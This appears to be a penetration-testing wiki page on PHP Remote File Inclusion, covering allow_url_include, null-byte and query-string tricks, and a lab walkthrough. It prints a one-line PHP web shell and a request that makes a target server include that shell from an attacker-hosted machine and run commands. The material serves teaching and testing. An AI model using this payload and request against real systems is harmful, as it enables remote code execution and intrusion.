---
description: Leveraging RFI vulnerabilities
---

# Remote File Inclusion

Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the server must be configured in a very specific way, but they are usually easier to exploit.

## PHP RFI

PHP apps must be configured with `allow_url_include` set to `On`. Older versions of PHP set this on by default but newer versions default to `Off`. If one can force a web application to load a remote file and execute the code, there is more flexibility in creating the exploit payload.

### PHP Null Byte Vulnerability

Older versions of PHP have a vulnerability in which a null byte (`%00`) will terminate any string. This trick can be used to bypass file extensions added server-side and is useful for file inclusions because it prevents the file extension from being considered as part of the string. In other words, if an application reads in a parameter and appends "`.php`" to it, a null byte passed in the parameter effectively ends the string without the "`.php`" extension. This gives an attacker more flexibility in what files can be loaded with the file inclusion vulnerability.

Another trick for RFI payloads is to end them with a question mark (`?`) to mark anything added to the URL server-side as part of the query string.

### Example

Consider the machine used in the LFI example (located at `10.11.0.22`). The same field used to exploit the LFI (the `\menu.php` page which takes a `file=` parameter) can also be used to exploit an RFI.

Consider an attacker hosting a malicious file (`evil.txt` placed in the `/var/www/html` directory and served by Apache) on their machine (located at `10.11.0.4`):

{% code title="evil.txt" %}
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
{% endcode %}

The vulnerable application could then be prompted to request the file by simply navigating to the menu page and providing the attacker's machine as a `file` parameter. E.g. `http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt`

In order to turn this into an exploit the request will also need to include a `cmd` parameter that will be used by the PHP script.

In order to run the `ipconfig` command and view the output in the browser one would request:&#x20;

```
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```

While this serves as a simple example, in reality, if an attacker can exploit a RFI vulnerability it would make much more sense to upload either a shell (many examples on Kali at `/usr/share/webshells`) or some other crafted piece of malware.
